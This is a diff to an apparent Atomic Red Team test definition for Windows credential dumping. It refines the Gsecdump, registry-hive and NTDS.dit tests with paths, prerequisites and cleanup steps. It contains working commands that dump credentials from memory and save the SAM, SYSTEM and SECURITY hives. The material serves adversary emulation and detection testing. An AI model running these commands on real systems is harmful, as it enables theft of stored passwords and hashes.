@@ -5,7 +5,7 @@ display_name: Credential Dumping
 atomic_tests:
   - name: Powershell Mimikatz
     description: |
-      Dumps Credentials via Powershell by invoking a remote mimikatz script
+      Dumps credentials from memory via Powershell by invoking a remote mimikatz script
     supported_platforms:
       - windows
     input_arguments:
@@ -21,15 +21,30 @@ atomic_tests:
 
   - name: Gsecdump
     description: |
-      https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
+      Dump credentials from memory using Gsecdump
     supported_platforms:
       - windows
+
+    input_arguments:
+      gsecdump_exe:
+        description: Path to the Gsecdump executable
+        type: Path
+        default: PathToAtomicsFolder\T1003\bin\gsecdump.exe
+
+    dependency_executor_name: powershell
+    dependencies:
+      - description: |
+          Windows Credential Editor must exist on disk at specified location (#{wce_exe})
+        prereq_command: |
+          if (Test-Path #{gsecdump_exe}) {0} else {1}
+        get_prereq_command: |
+          Write-Host Automated installer not implemented yet
 
     executor:
       name: command_prompt
       elevation_required: true
       command: |
-        gsecdump -a
+        #{gsecdump_exe} -a
 
   - name: Windows Credential Editor
     description: |
@@ -81,17 +96,18 @@ atomic_tests:
       via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
     supported_platforms:
       - windows
+
     executor:
       name: command_prompt
       elevation_required: true
       command: |
-        reg save HKLM\sam sam
-        reg save HKLM\system system
-        reg save HKLM\security security
+        reg save HKLM\sam %temp%\sam
+        reg save HKLM\system %temp%\system
+        reg save HKLM\security %temp%\security
       cleanup_command: |
-        rm sam
-        rm system
-        rm security
+        rm %temp%\sam
+        rm %temp%\system
+        rm %temp%\security
 
   - name: Dump LSASS.exe Memory using ProcDump
     description: |
@@ -178,11 +194,21 @@ atomic_tests:
       subsequent domain controllers without the need of network-based replication.
     supported_platforms:
       - windows
+
     input_arguments:
       output_folder:
         description: Path where resulting dump should be placed
         type: Path
         default: C:\Atomic_Red_Team
+
+    dependencies:
+      - description: |
+          Target must be a Domain Controller
+        prereq_command: |
+          reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
+        get_prereq_command: |
+          echo Sorry, Promoting this machine to a Domain Controller must be done manually
+
     executor:
       name: command_prompt
       elevation_required: true
@@ -194,11 +220,21 @@ atomic_tests:
       The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
     supported_platforms:
       - windows
+      
     input_arguments:
       drive_letter:
         description: Drive letter to source VSC (including colon)
         type: String
         default: "C:"
+
+    dependencies:
+      - description: |
+          Target must be a Domain Controller
+        prereq_command: |
+          reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
+        get_prereq_command: |
+          echo Sorry, Promoting this machine to a Domain Controller must be done manually
+
     executor:
       name: command_prompt
       elevation_required: true
